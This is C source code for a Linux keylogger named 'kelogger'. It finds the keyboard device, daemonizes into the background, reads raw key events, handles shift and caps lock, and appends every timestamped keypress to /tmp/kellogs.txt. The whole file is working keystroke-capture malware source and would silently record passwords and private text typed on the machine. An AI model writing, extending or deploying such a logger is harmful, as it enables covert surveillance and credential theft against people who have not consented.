#include <stdio.h>
#include <fcntl.h>
#include <sys/syslog.h>
#include <unistd.h>
#include <linux/input.h>
#include <time.h>
#include <errno.h>
#include <syslog.h>
#include <sys/ioctl.h>
#include <glob.h>
#include "keycodes.h"
#include "daemonize.h"
#include "find-keyboard.h"

int main(int argc, char * argv[]){
        int exit_code = 0;
        if (argc > 2){
            printf("Usage: %s <event-file>\n e.g. %s /dev/input/event7\n", argv[0], argv[0]);
            return 1;
        }
        // temporary, before daemonize()
        int fd = find_keyboard_fd();
        printf("find_keyboard_fd returned: %d\n", fd);

        daemonize();
        openlog("kelogger", LOG_PID, LOG_DAEMON);

        if (argc == 2){
            close(fd); //close auto-detected keyboard;
            fd = open(argv[1], O_RDONLY, 0);
        }
        if (fd < 0){
            syslog(LOG_ERR, "failed to open keyboard device: %m");
            return 1;
        }

        // read initial caps lock state from keyboard LED
        
        FILE *logfile = fopen("/tmp/kellogs.txt", "a"); //append mode
        if (!logfile){
            syslog(LOG_ERR, "fopen\() failed %m"); //%m stderr(errno)
            return 1;
        }
        
        struct input_event ie;

        
        int shift_held = 0;

        //Get caps_on state
        int led_state = 0;
        ioctl(fd, EVIOCGLED(sizeof(led_state)), &led_state);
        int caps_on = (led_state >> 1) & 1;

        while(1){         
            ssize_t result = read(fd, &ie, sizeof(ie));
            if (result != sizeof(ie)) {
                if (errno == EBADF) {
                    syslog(LOG_ERR, "read\() failed: %m. Try opening keyboard input event file as root?");
                } else {
                     syslog(LOG_ERR, "read\() failed: %m");
                }
                exit_code = 1;
                break;
            }
            
            time_t t = ie.time.tv_sec;
            struct tm *tm_info = localtime(&t);
            char timebuf[32];
            strftime(timebuf, sizeof(timebuf), "%Y-%m-%d %H:%M:%S", tm_info);
    
            if (ie.type != 1){ 
                continue;
            }

            if (ie.code == 42 || ie.code == 54){
                shift_held = (ie.value == 1);
                continue;
            }
            if (ie.code == 58){
                if (ie.value == 1){
                    caps_on = !caps_on;
                    fprintf(logfile, "[%s] [CAPSLOCK]\n", timebuf);
                    fflush(logfile);
                }
                 continue;
            }
            if (ie.value == 1){
                int use_upper = shift_held ^ caps_on;
                const char *key = use_upper ? keycode_to_str_shifted(ie.code)
                                            : keycode_to_str(ie.code);
                fprintf(logfile, "[%s] %s\n", timebuf, key);
                fflush(logfile);
            }
        }
    
    
    close(fd);
    fclose(logfile);
    closelog();
    return exit_code;
}


/*  ie.value has 3 possible values for key events:

    1 = keydown (key was just pressed)
    0 = keyup (key was just released)
    2 = autorepeat (key is being held down and the OS is firing repeat events)
*/
